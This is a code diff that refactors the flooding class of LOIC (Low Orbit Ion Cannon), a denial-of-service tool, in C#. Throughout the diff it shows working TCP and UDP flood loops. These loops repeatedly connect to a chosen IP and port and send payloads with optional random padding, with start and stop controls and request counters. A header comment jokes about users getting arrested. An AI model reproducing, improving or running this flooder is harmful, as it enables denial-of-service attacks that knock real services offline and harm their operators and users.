@@ -1,21 +1,25 @@
+/* LOIC - Low Orbit Ion Cannon
+ * Released to the public domain
+ * Enjoy getting v&, kids.
+ */
+
 using System;
-using System.Net.Sockets;
 using System.ComponentModel;
+using System.Net;
+using System.Net.Sockets;
 
 namespace LOIC
 {
-	public class XXPFlooder
+	public class XXPFlooder : cHLDos
 	{
-		public bool IsFlooding { get; set; }
-		public int FloodCount { get; set; }
-		public int Failed { get; set; }
-		public string IP { get; set; }
-		public int Port { get; set; }
-		public int Protocol { get; set; }
-		public int Delay { get; set; }
-		public bool Resp { get; set; }
-		public string Data { get; set; }
-		private bool random;
+		private BackgroundWorker bw;
+
+		private readonly string IP;
+		private readonly int Port;
+		private readonly int Protocol;
+		private readonly bool Resp;
+		private readonly string Data;
+		private readonly bool AllowRandom;
 
 		public XXPFlooder(string ip, int port, int proto, int delay, bool resp, string data, bool random)
 		{
@@ -25,83 +29,82 @@ namespace LOIC
 			this.Delay = delay;
 			this.Resp = resp;
 			this.Data = data;
-			this.random = random;
-			this.FloodCount = 0;
+			this.AllowRandom = random;
+			this.Requested = 0;
 			this.Failed = 0;
 		}
-		public void Start()
+		public override void Start()
 		{
-			IsFlooding = true;
-			var bw = new BackgroundWorker();
-			bw.DoWork += new DoWorkEventHandler(bw_DoWork);
-			bw.RunWorkerAsync();
+			this.IsFlooding = true;
+			this.bw = new BackgroundWorker();
+			this.bw.DoWork += bw_DoWork;
+			this.bw.RunWorkerAsync();
+			this.bw.WorkerSupportsCancellation = true;
+		}
+		public override void Stop()
+		{
+			this.IsFlooding = false;
+			this.bw.CancelAsync();
 		}
 		private void bw_DoWork(object sender, DoWorkEventArgs e)
 		{
 			try
 			{
-						byte[] buf;
-				if (random == true)
+				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(IP), Port);
+				while (this.IsFlooding)
 				{
-					buf = System.Text.Encoding.ASCII.GetBytes(String.Format(Data, Functions.RandomString()));
-				}
-				else
-						{
-					buf = System.Text.Encoding.ASCII.GetBytes(Data);
-				}
-
-				var RHost = new System.Net.IPEndPoint(System.Net.IPAddress.Parse(IP), Port);
-				while (IsFlooding)
-				{
-					Socket socket = null;
-					if (Protocol == 1)
+					State = ReqState.Ready; // SET STATE TO READY //
+					if(Protocol == 1)
 					{
-						try
+						using (Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp))
 						{
-							socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 							socket.NoDelay = true;
-							socket.Connect(RHost);
+							State = ReqState.Connecting; // SET STATE TO CONNECTING //
+
+							try { socket.Connect(RHost); }
+							catch { continue; }
+
 							socket.Blocking = Resp;
+							State = ReqState.Requesting; // SET STATE TO REQUESTING //
+
 							try
 							{
-								while (IsFlooding)
+								while (this.IsFlooding)
 								{
-									FloodCount++;
+									Requested++;
+									byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : "")));
 									socket.Send(buf);
-									if (Delay > 0) System.Threading.Thread.Sleep(Delay);
+									if (Delay >= 0) System.Threading.Thread.Sleep(Delay + 1);
 								}
 							}
-							catch { } // connection reset
-						}
-						catch
-						{ // host unreachable
-							Failed++;
+							catch { Failed++; }
 						}
 					}
-					if (Protocol == 2)
+					if(Protocol == 2)
 					{
-						socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
-						socket.Blocking = Resp;
-						try
+						using (Socket socket = new Socket(RHost.AddressFamily, SocketType.Dgram, ProtocolType.Udp))
 						{
-							while (IsFlooding)
+							socket.Blocking = Resp;
+							State = ReqState.Requesting; // SET STATE TO REQUESTING //
+
+							try
 							{
-								FloodCount++;
-								socket.SendTo(buf, SocketFlags.None, RHost);
-								if (Delay > 0) System.Threading.Thread.Sleep(Delay);
+								while (this.IsFlooding)
+								{
+									Requested++;
+									byte[] buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : "")));
+									socket.SendTo(buf, SocketFlags.None, RHost);
+									if (Delay >= 0) System.Threading.Thread.Sleep(Delay + 1);
+								}
 							}
-						}
-						catch
-						{
-							Failed++;
+							catch { Failed++; }
 						}
 					}
 				}
 			}
-			catch
-			{
-				IsFlooding = false;
-			}
+			// Analysis disable once EmptyGeneralCatchClause
+			catch { }
+			finally { State = ReqState.Ready; this.IsFlooding = false; }
 		}
 	}
 }
